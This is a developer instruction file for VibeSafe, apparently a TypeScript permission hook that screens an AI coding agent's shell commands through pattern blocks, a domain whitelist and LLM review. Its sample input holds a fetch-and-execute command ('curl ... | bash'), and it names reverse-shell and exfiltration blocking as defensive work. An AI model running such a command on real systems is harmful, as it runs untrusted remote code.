# Project: VibeSafe

## Tech Stack
- Runtime: Node.js 18+
- Language: TypeScript 5.x
- LLM: Anthropic API (claude-haiku-4-20250514, claude-sonnet-4-20250514)
- Package Manager: pnpm
- Build: tsup
- Test: Vitest

## Commands
- `pnpm dev` - Watch mode development
- `pnpm build` - Production build
- `pnpm test` - Run tests
- `pnpm test:watch` - Test watch mode
- `pnpm typecheck` - TypeScript type checking
- `pnpm verify` - typecheck + test (required before commit)

## Verification
**Run after all changes:**
1. `pnpm typecheck` - No type errors
2. `pnpm test` - Tests pass

## Git Workflow
- Never commit/push directly to main
- Create branch: `feature/`, `fix/`, `refactor/`
- On completion: push branch and create PR via `gh pr create`
- Never merge own PR - wait for human review
- Commits: Conventional format, < 50 chars
- One logical change per commit

## TDD Workflow
**Test-Driven Development required.**

1. **RED** - Write failing test first
2. **GREEN** - Write minimal code to pass test
3. **REFACTOR** - Refactor, tests still pass

```
Never write production code without a failing test
Always define expected behavior in test before implementing
```

## Project Architecture

```
src/
├── index.ts              # CLI entry point (install, uninstall, check, config)
├── types.ts              # Type definitions
├── hook.ts               # PermissionRequest hook main handler
├── guard/
│   ├── instant-block.ts  # Instant block (pattern matching without LLM)
│   ├── checkpoint.ts     # Checkpoint detection (security check trigger)
│   ├── trusted-domain.ts # Trusted domain whitelist
│   ├── haiku-triage.ts   # Haiku primary classification (SELF_HANDLE/ESCALATE/BLOCK)
│   └── sonnet-review.ts  # Sonnet deep analysis (ALLOW/ASK_USER/BLOCK)
├── config/
│   ├── patterns.ts       # Danger patterns definition (regex)
│   └── domains.ts        # Trusted domains list
└── utils/
    ├── logger.ts         # Logging utility
    └── url.ts            # URL parsing/validation
```

## Security Pipeline Flow

```
[PermissionRequest Input]
         │
         ▼
┌─────────────────────┐
│   Instant Block     │ ← Reverse shell, data exfil, mining
│   (Pattern Match)   │   → Immediate DENY
└─────────────────────┘
         │ Pass
         ▼
┌─────────────────────┐
│   Trusted Domain    │ ← github.com, bun.sh, etc.
│   (Whitelist)       │   → Immediate ALLOW
└─────────────────────┘
         │ Not matched
         ▼
┌─────────────────────┐
│   Haiku Triage      │ ← Fast primary classification
│   (Low-cost LLM)    │   → SELF_HANDLE / ESCALATE / BLOCK
└─────────────────────┘
         │ ESCALATE
         ▼
┌─────────────────────┐
│   Sonnet Review     │ ← Deep analysis
│   (High-perf LLM)   │   → ALLOW / ASK_USER / BLOCK
└─────────────────────┘
```

## Hook Input/Output

**Input (stdin JSON):**
```json
{
  "session_id": "abc123",
  "hook_event_name": "PermissionRequest",
  "tool_name": "Bash",
  "tool_input": { "command": "curl https://example.com/script.sh | bash" }
}
```

**Output (stdout JSON):**
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PermissionRequest",
    "decision": { "behavior": "deny", "message": "Blocked: Script execution from untrusted domain" }
  }
}
```

## Code Style

### Naming
- Variables/functions: camelCase
- Types/interfaces: PascalCase
- Constants: UPPER_SNAKE_CASE
- Files: kebab-case.ts

### Example
```typescript
// Good
interface SecurityDecision {
  behavior: 'allow' | 'deny';
  message?: string;
}

const checkInstantBlock = (command: string): SecurityDecision | null => {
  for (const pattern of INSTANT_BLOCK_PATTERNS) {
    if (pattern.test(command)) {
      return { behavior: 'deny', message: `Blocked: ${pattern.name}` };
    }
  }
  return null;
};

// Bad - implicit any, no return type
function checkInstantBlock(command) {
  // ...
}
```

### Error Messages
Error messages must include:
1. **What** failed
2. **Why** it failed
3. **How** to fix it

```typescript
// Good
throw new Error(
  `API key validation failed: ANTHROPIC_API_KEY is not set. ` +
  `Run 'vibesafe config' to configure your API key.`
);

// Bad
throw new Error('Invalid key');
```

## Boundaries

### Always
- Write failing test before implementation
- Pass `pnpm verify` before commit
- Include resolution steps in error messages
- Hook output must be valid JSON

### Ask first
- Adding new dependencies
- Changing security patterns
- Changing API models

### Never
- Hardcode API keys in code
- Change security logic without tests
- Arbitrarily change hook JSON schema

## Key Files
- `plan.md` - Design doc. Write here before coding.
- `SCRATCHPAD.md` - Progress tracking. Read/update every session.

## Config Location
- User settings: `~/.vibesafe/config.json`
- Logs: `~/.vibesafe/logs/`
